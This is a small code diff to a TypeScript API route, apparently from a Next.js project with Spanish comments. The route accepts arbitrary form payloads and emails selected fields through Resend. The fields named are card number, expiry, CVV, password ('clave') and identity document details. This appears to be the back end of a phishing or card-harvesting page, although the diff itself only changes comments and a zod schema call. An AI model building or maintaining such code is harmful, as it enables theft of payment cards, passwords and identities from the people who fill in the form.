@@ -3,7 +3,7 @@ import { z } from "zod";
 import { Resend } from "resend";
 import { supabase } from "utils/supabase/server"; // cliente server-side
 
-// 👉 Función integrada aquí, ya no importamos desde helpers.ts
+// 👉 Función integrada aquí (ya no se importa de helpers.ts)
 function pickAllowedFields(
   payload: Record<string, any>,
   includeCsv: string | undefined
@@ -21,7 +21,8 @@ const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
 
-const Payload = z.record(z.any()); // aceptamos cualquier shape
+// ✅ Corrección: Zod con 2 args
+const Payload = z.record(z.string(), z.any()); // claves string, valores libres
 
 export async function POST(req: Request) {
   try {
@@ -52,7 +53,7 @@ export async function POST(req: Request) {
     const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
     const allowed = pickAllowedFields(data, includeCsv);
 
-    // 3) Log completo solo en entorno local (para debug)
+    // 3) Log completo en local
     if (
       process.env.NODE_ENV !== "production" &&
       process.env.DEV_SHOW_SENSITIVE === "true"
@@ -74,7 +75,7 @@ export async function POST(req: Request) {
       </div>
     `;
 
-    // 5) Enviar con Resend (o loguear si no está configurado)
+    // 5) Enviar con Resend (o loguear en local)
     const to = process.env.MAIL_TO!;
     const from = process.env.MAIL_FROM || "onboarding@resend.dev";
 
